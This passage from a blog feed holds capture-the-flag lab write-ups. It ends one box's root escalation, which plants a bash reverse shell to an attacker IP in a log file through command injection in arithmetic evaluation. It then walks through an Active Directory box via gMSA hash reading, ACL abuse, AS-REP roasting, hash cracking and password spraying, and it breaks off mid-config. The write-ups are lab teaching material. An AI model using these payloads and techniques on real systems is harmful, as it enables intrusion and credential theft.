&lt;p>This time we see that a developers group members have the permission of full rights to modify the directory means we can delete and replace the &lt;strong>aplication.log&lt;/strong> file.&lt;/p>
&lt;h3 id="2-open-the-reverse-shell">2. Open the Reverse Shell:&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo rlwrap nc -nlvp &lt;span class="m">80&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="3-remove-the-applicationlog-from-the-directory">3. Remove the application.log from the directory:&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">rm -f /var/www/web/user-management-service/log/application.log
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="4-create-the-malicious-applicationlog-on-the-target-directly-for-root">4. Create the malicious application.log on the target directly for root:&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">echo&lt;/span> &lt;span class="s1">&amp;#39;HTTP Status: x[$(/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.16.91/80 0&amp;gt;&amp;amp;1)]&amp;#39;&lt;/span> &amp;gt; /var/www/web/user-management-service/log/application.log
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250429153239-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;h3 id="why-this-worked-">&lt;strong>Why This Worked ?&lt;/strong>&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>The &lt;code>x[$(...)]&lt;/code> structure **forces Bash to evaluate the command inside &lt;code>$()&lt;/code> ** before arithmetic comparison (&lt;code>-eq&lt;/code>).&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Here’s what happens step-by-step:&lt;/p>
&lt;ol>
&lt;li>The script extracts &lt;code>x[$(/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.16.91/80 0&amp;gt;&amp;amp;1)]&lt;/code> as the &amp;ldquo;status code.&amp;rdquo;&lt;/li>
&lt;li>When the script runs &lt;code>[[ &amp;quot;$code&amp;quot; -eq &amp;quot;some_number&amp;quot; ]]&lt;/code>, Bash:&lt;br>
&lt;strong>First tries to evaluate &lt;code>x[$(...)]&lt;/code> as an arithmetic expression&lt;/strong>.
&lt;ul>
&lt;li>Since&lt;code>x[&lt;/code> is not a valid number Bash &lt;strong>executes the command substitution &lt;code>$(...)&lt;/code>&lt;/strong> as a fallback.&lt;/li>
&lt;li>The reverse shell triggers &lt;strong>before&lt;/strong> the comparison fails.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;/li>
&lt;/ul>
&lt;h4 id="check-the-listener">&lt;strong>Check the Listener:&lt;/strong>&lt;/h4>
&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250429153508-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;h2 id="alhamdulillah-root-done">&lt;strong>ALHAMDULILLAH&lt;/strong> ROOT DONE&lt;/h2></description></item><item><title>Vintage</title><link>http://localhost:1313/blog/vintage-htb/</link><pubDate>Sat, 10 May 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/blog/vintage-htb/</guid><description>&lt;div style="text-align: center; font-size: 2em; font-weight: bold; color: MediumSpringGreen;">
VINTAGE-HTB-ACTIVE DIRECTORY
&lt;/div>
&lt;h2 id="1-nmap-scan">1. &lt;strong>NMAP-SCAN&lt;/strong>:&lt;/h2>
&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;h3 id="initial-access-was-given">Initial Access was given:&lt;/h3>
&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>&lt;code>Username:&lt;/code>&lt;em>P.Rosa&lt;/em>
&lt;code>Password:&lt;/code> &lt;strong>Rosaisbest123&lt;/strong>&lt;/p>
&lt;p>We ran bloodhound python to a get view of active directory.&lt;/p>
&lt;h2 id="2-bloodhound-python-">2. &lt;strong>BLOODHOUND-PYTHON&lt;/strong> :&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo bloodhound-python -u &lt;span class="s2">&amp;#34;P.Rosa&amp;#34;&lt;/span> -p &lt;span class="s2">&amp;#34;Rosaisbest123&amp;#34;&lt;/span> -d vintage.htb -c all --zip -ns 10.10.11.45
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-2.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-3.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>In bloodhound we checked:&lt;/p>
&lt;p>&lt;code>Group Membership &amp;gt; Unrolled Member Of&lt;/code>&lt;/p>
&lt;h3 id="what-is-unrolled-group-members-">What is Unrolled Group members ?&lt;/h3>
&lt;p>Unrolled members include users or groups that are &lt;strong>indirectly members of a group&lt;/strong> due to group nesting.&lt;/p>
&lt;p>&lt;em>For example:&lt;/em>&lt;/p>
&lt;ul>
&lt;li>Group Team1 is added to Admins.&lt;/li>
&lt;li>User Bob is a direct member of Team1&lt;/li>
&lt;li>Bob becomes an unrolled member of Admins because of group nesting&lt;/li>
&lt;/ul>
&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-4.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>We can see that, Unrolled Member Of Domain Users have One Strange Group Which is PRE-WINDOWS 2000 COMPATIBLE &lt;code>ACCESS@VINTAGE.HTB&lt;/code>&lt;/p>
&lt;p>Upon researching about the Pre-Windows 2000 we found:&lt;/p>
&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-5.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>&lt;code>This means that there will be a Computer in this Group which will have a password same of its username&lt;/code>&lt;/p>
&lt;p>So we need to check PRE-WINDOWS 2000 COMPATIBLE &lt;code>ACCESS@VINTAGE.HTB&lt;/code> Members&lt;/p>
&lt;ol>
&lt;li>Click On PRE-WINDOWS 2000 COMPATIBLE &lt;code>ACCESS@VINTAGE.HTB&lt;/code>&lt;/li>
&lt;li>Check its Direct Members&lt;/li>
&lt;/ol>
&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-6.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>We found &lt;code>FS01.VINTAGE.HTB&lt;/code>. So possibly it will have the same password of its username. First, We check its name in Bloodhound:&lt;/p>
&lt;ul>
&lt;li>Click FS01.VINTAGE.HTB&lt;/li>
&lt;li>Node Info &amp;gt; Extra Properties
&lt;ul>
&lt;li>SameAccountName: FS01$&lt;/li>
&lt;li>serviceprincipalnames: RestrictedKrbHost/fs01 HOST/fs0&lt;/li>
&lt;li>RestrictedKrbHost/FS01.vintage.htb HOST/FS01.vintage.htb&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;p>From the node Info &lt;strong>ServicePrincipalname&lt;/strong> gives an hint of Kerberoast attack but we will first check it via Netexec&lt;/p>
&lt;h2 id="3-password-spraying-via-netexec">3. &lt;strong>PASSWORD SPRAYING VIA NETEXEC&lt;/strong>:&lt;/h2>
&lt;p>We first sprayed with winrm, wmi but both didn’t worked and gave error via netexec and crackmapexec. Then we tried ldap just to verify our password is correct for FS01$. Also Remember User -k &lt;code>Since ntlm authentication is disable in this case&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo netexec ldap  10.10.11.45 -u usernames.txt -p passwords.txt -k --continue-on-success
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-7.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>Output verifies our password for FS01$ is indeed correct. &lt;strong>Alhamdulillah&lt;/strong>&lt;/p>
&lt;h2 id="4-generating-ticket-via-impacket-gettgt-via-fs01-credentials-">4. &lt;strong>GENERATING TICKET VIA IMPACKET-getTGT VIA FS01$ CREDENTIALS&lt;/strong> :&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">impacket-getTGT vintage.htb/FS01&lt;span class="se">\$&lt;/span>:fs01 -dc-ip vintage.htb
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-8.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>Kerberos based attacks require synchronization of time with the Remote server.&lt;/p>
&lt;p>The &lt;code>ntpdate&lt;/code> command is used to manually synchronize the system clock with a remote NTP (Network Time Protocol) server. It sets the local date and time by querying the NTP server and is typically used for one-time time synchronization, not continuous syncing&lt;/p>
&lt;p>Hence, we need to configure the ntp:&lt;/p>
&lt;ol>
&lt;li>sudo mousepad &lt;strong>/etc/ntp.conf&lt;/strong>&lt;/li>
&lt;li>sudo ntpdate 10.10.11.45&lt;/li>
&lt;li>sudo mousepad &lt;strong>/etc/krb5user.conf&lt;/strong>&lt;/li>
&lt;li>&lt;code>export KRB5CCNAME=$PWD/'FS01$.ccache'&lt;/code>&lt;/li>
&lt;li>klist&lt;/li>
&lt;/ol>
&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-9.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;h2 id="5-bloodhound-as-fs01-">5. &lt;strong>BLOODHOUND AS FS01$&lt;/strong> :&lt;/h2>
&lt;ul>
&lt;li>Bloodhound again &amp;gt; Check &lt;code>FS01@VINTAGE.HTB&lt;/code>&lt;/li>
&lt;li>Check Outbound Object Control &amp;gt; Group Delegated Object Control&lt;/li>
&lt;/ul>
&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-10.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>We can see,
&lt;strong>FS01 is a member of DOMAIN &lt;code>COMPUTERS@VINTAGE.HTB&lt;/code> where domain computers group can ReadGMSAPassword. So with the FS01 Creds (ccache in our case) we can ReadGMSAPassword&lt;/strong>&lt;/p>
&lt;h2 id="6-reading-gmsapassword-via-bloodyad-with-as-fs01-ccache-">6. &lt;strong>READING GMSAPASSWORD VIA BLOODYAD WITH AS FS01$ CCACHE&lt;/strong> :&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">bloodyAD --host &lt;span class="s2">&amp;#34;dc01.vintage.htb&amp;#34;&lt;/span> -d &lt;span class="s2">&amp;#34;vintage.htb&amp;#34;&lt;/span> -k &lt;span class="nv">ccache&lt;/span>&lt;span class="o">=&lt;/span>~/hackthebox-vms/vintage/FS01&lt;span class="se">\$&lt;/span>.ccache --dc-ip &lt;span class="s2">&amp;#34;10.10.11.45&amp;#34;&lt;/span> get object &lt;span class="s1">&amp;#39;CN=GMSA01,CN=Managed Service Accounts,DC=vintage,DC=htb&amp;#39;&lt;/span> --attr &lt;span class="s1">&amp;#39;msDS-ManagedPassword&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-11.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>&lt;code>**msDS-ManagedPassword.NTLM:&lt;/code> &lt;strong>aad3b435b51404eeaad3b435b51404ee:cfa9f6edd15de88ae7a9652114e3f4a7&lt;/strong>&lt;/p>
&lt;p>We can pass the hash now since we have the ntlm hash of GMSA&lt;/p>
&lt;h2 id="7-bloodhound-again-for-gmsa-nodes-and-membership-">7. **BLOODHOUND AGAIN FOR GMSA NODES AND MEMBERSHIP :&lt;/h2>
&lt;p>&lt;code>Outbound Object Control &amp;gt; First Degree Object Control&lt;/code>&lt;/p>
&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-12.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-13.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>&lt;code>GMSA01$@VINTAGE.HTB HAS GENERICWRITE ACCESS OVER SERVICEMANAGERS@VINTAGE.HTB&lt;/code>&lt;/p>
&lt;p>Since the box is based on Kerberos authentication, and NTLM is disabled so we need to convert the credentials into Kerberos TGT ccache&lt;/p>
&lt;h2 id="8-gmsa01-credentials-into-kerberos-ticket-tgt-via-impacket-gettgt-">8. &lt;strong>GMSA01$ CREDENTIALS INTO KERBEROS TICKET (TGT) VIA IMPACKET-getTGT&lt;/strong> :&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">impacket-getTGT vintage.htb/&lt;span class="s1">&amp;#39;GMSA01$&amp;#39;&lt;/span> -hashes **aad3b435b51404eeaad3b435b51404ee:cfa9f6edd15de88ae7a9652114e3f4a7** -dc-ip vintage.htb
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-14.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;ul>
&lt;li>&lt;code>export KRB5CCNAME=$PWD/'GMSA01$.ccache'&lt;/code>&lt;/li>
&lt;li>klist&lt;/li>
&lt;/ul>
&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-15.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;h2 id="9-abusing-genericwrite-access-over-servicemanagersvintagehtb-with-kerberos-ticket-">9. &lt;strong>ABUSING GENERICWRITE ACCESS OVER &lt;code>SERVICEMANAGERS@VINTAGE.HTB&lt;/code> WITH KERBEROS TICKET&lt;/strong> :&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">bloodyAD --host &lt;span class="s2">&amp;#34;dc01.vintage.htb&amp;#34;&lt;/span> -d &lt;span class="s2">&amp;#34;vintage.htb&amp;#34;&lt;/span> -k add groupMember &lt;span class="s2">&amp;#34;ServiceManagers&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;GMSA01&lt;/span>$&lt;span class="s2">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-16.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>Since we have added the GMSA01$ to the ServiceManagers we need to renegerate a new TGT for GMSA01$ which will have that GroupManagers access in it.&lt;/p>
&lt;h2 id="10-regenerating-gmsa01-credentials-as-kerberos-ticket-tgt-via-impacket-gettgt-">10. &lt;strong>REGENERATING GMSA01$ CREDENTIALS AS KERBEROS TICKET (TGT) VIA IMPACKET-getTGT&lt;/strong> :&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">impacket-getTGT vintage.htb/&lt;span class="s1">&amp;#39;GMSA01$&amp;#39;&lt;/span> -hashes **aad3b435b51404eeaad3b435b51404ee:cfa9f6edd15de88ae7a9652114e3f4a7** -dc-ip vintage.htb
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>export KRB5CCNAME=$PWD/'GMSA01$.ccache'&lt;/code>&lt;/p>
&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-17.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;h2 id="11-bloodhound-again-as-servicemanagers-">11. &lt;strong>BLOODHOUND AGAIN AS SERVICEMANAGERS&lt;/strong> :&lt;/h2>
&lt;ul>
&lt;li>Outbound object control &amp;gt; first degree object control&lt;/li>
&lt;/ul>
&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-18.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>We see ServiceMangers have GenericAll Access over 3 Users. Since GMSA01$ is what we added it into that ServiceManagers group so he will also have that GenericAll Access over these 3 machines.&lt;/p>
&lt;ul>
&lt;li>We checked &lt;strong>Sql_svc&lt;/strong>, but found out its disabled account&lt;/li>
&lt;/ul>
&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-19.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>First enable it then we can change the password of &lt;strong>sql_svc&lt;/strong>&lt;/p>
&lt;h2 id="12-enabling-sql_svc-via-gmsa01-">12. &lt;strong>ENABLING SQL_SVC VIA GMSA01$&lt;/strong> :&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">bloodyAD --host &lt;span class="s2">&amp;#34;dc01.vintage.htb&amp;#34;&lt;/span> -d &lt;span class="s2">&amp;#34;vintage.htb&amp;#34;&lt;/span> -k add uac &lt;span class="s2">&amp;#34;svc_sql&amp;#34;&lt;/span> -f &lt;span class="s2">&amp;#34;NORMAL_ACCOUNT&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-20.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;h2 id="13-abusing-genericall-on-sql_svc-via-gmsa01-">13. &lt;strong>ABUSING GENERICALL ON SQL_SVC VIA GMSA01&lt;/strong> :&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">bloodyAD --host &lt;span class="s2">&amp;#34;dc01.vintage.htb&amp;#34;&lt;/span> -d &lt;span class="s2">&amp;#34;vintage.htb&amp;#34;&lt;/span> -k add genericAll SVC_SQL &lt;span class="s1">&amp;#39;GMSA01$&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-21.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;h2 id="14-extracting-usernames-via-ldapsearch-">14. &lt;strong>EXTRACTING USERNAMES VIA LDAPSEARCH&lt;/strong> :&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ldapsearch -x -H ldap://10.10.11.45 -D &lt;span class="s2">&amp;#34;P.Rosa@vintage.htb&amp;#34;&lt;/span> -w &lt;span class="s2">&amp;#34;Rosaisbest123&amp;#34;&lt;/span> -b &lt;span class="s2">&amp;#34;DC=vintage,DC=htb&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;(objectClass=user)&amp;#34;&lt;/span> sAMAccountName &lt;span class="p">|&lt;/span> grep &lt;span class="s2">&amp;#34;sAMAccountName:&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> cut -d &lt;span class="s2">&amp;#34; &amp;#34;&lt;/span> -f &lt;span class="m">2&lt;/span> &amp;gt; usernames.txt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-22.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;h2 id="15-attempting-kerberos-for-finding-any-hash">15. &lt;strong>ATTEMPTING KERBEROS FOR FINDING ANY HASH&lt;/strong>:&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">impacket-GetNPUsers -dc-ip 10.10.11.45 -request -usersfile usernames.txt vintage.htb/
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-23.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;h2 id="16-adding-dont-require-preauth-set-">16. &lt;strong>ADDING DON’T REQUIRE PREAUTH SET&lt;/strong> :&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">bloodyAD --host dc01.vintage.htb -d &lt;span class="s2">&amp;#34;VINTAGE.HTB&amp;#34;&lt;/span> --dc-ip 10.10.11.45 -k add uac SVC_SQL -f DONT_REQ_PREAUTH
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="17-impacket-getnpusers-again-">17. &lt;strong>IMPACKET-GETNPUSERS (AGAIN)&lt;/strong> :&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">impacket-GetNPUsers -dc-ip 10.10.11.45 -request -usersfile usernames.txt vintage.htb/
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-24.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>&lt;code>$krb5asrep$23$svc_sql@VINTAGE.HTB:49d7a4e87c381d43ece06049320d233d$4e789eb6c6fc9891c14adafc39b2b742582fdff7f9fa6af972b4dbdf8a46197ea7546be882ad97fdf5a1c2e2e091b8182bcc259daa05db472dde5fcd3c4b952ef8fbaeecf7862c4824d95ac689810d8bd4adab5bb3cb1f70cd74b902a5abae08c6709e2cc8da7785e76de597b5307cb680d38199df63d88d3efee9e8c05189572be001470f7bec31855eb79a3a054d47a7815d0bcef15addbbf631c230fd4a3f3bcd10fee4c85ff5c340da8b28f94a1adbcac6dacc3b83f2222e37dde0a1ab52949376359ad1df5598ab0ca30fab89aa139ceb6cca535acfbff542f0a9aef312e20acc4679675710b682&lt;/code>&lt;/p>
&lt;p>We got the asrep hash of SQL_SVC which we can crack it.&lt;/p>
&lt;h2 id="18-cracking-via-hashcat-">18. &lt;strong>CRACKING VIA HASHCAT&lt;/strong> :&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">hashcat --help &lt;span class="p">|&lt;/span> grep -i &lt;span class="s2">&amp;#34;rep&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">hashcat -m &lt;span class="m">18200&lt;/span> sql_svc.hash  /usr/share/wordlists/rockyou.txt --force -r /usr/share/hashcat/rules/best64.rule
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-25.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-26.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>We got, &lt;code>sql_svc&lt;/code> password: &lt;strong>Zer0the0ne&lt;/strong>&lt;/p>
&lt;h2 id="19-password-spraying-via-kerbrute-">19. &lt;strong>PASSWORD SPRAYING VIA KERBRUTE&lt;/strong> :&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">./kerbrute_linux_amd64 --dc vintage.htb -d vintage.htb -v passwordspray usernames.txt Zer0the0ne
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-27.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>We got the,
&lt;code>Username:&lt;/code> &lt;strong>C.Neri&lt;/strong>
&lt;code>Password:&lt;/code> &lt;strong>Zer0the0ne&lt;/strong>&lt;/p>
&lt;h2 id="20-bloodhound-for-cneri-">20. &lt;strong>BLOODHOUND FOR C.NERI&lt;/strong> :&lt;/h2>
&lt;p>Outbound Object Control &amp;gt; Group Delegated Object Control&lt;/p>
&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-28.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;h2 id="21-generating-ticket-via-impacket-gettgt-with-cneri-creds-">21. &lt;strong>GENERATING TICKET VIA IMPACKET-getTGT WITH C.NERI CREDS&lt;/strong> :&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">impacket-getTGT vintage.htb/c.neri:Zer0the0ne -dc-ip vintage.htb
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>export KRB5CCNAME=$PWD/'c.neri.ccache'&lt;/code>&lt;/p>
&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-30.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;h3 id="attempt-evil-winrm-as-cneri-">&lt;strong>ATTEMPT EVIL-WINRM AS C.NERI :&lt;/strong>&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">evil-winrm -i dc01.vintage.htb -r vintage.htb
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./image-31.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>We got an error. This is because of Krb5.conf hasn&amp;rsquo;t been configured. So lets configured that.&lt;/p>
&lt;h2 id="22-updating-krb5conf-">22. &lt;strong>UPDATING KRB5.CONF&lt;/strong> :&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo mousepad /etc/krb5.conf
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>libdefaults&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">    &lt;span class="nv">default_realm&lt;/span> &lt;span class="o">=&lt;/span> VINTAGE.HTB
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
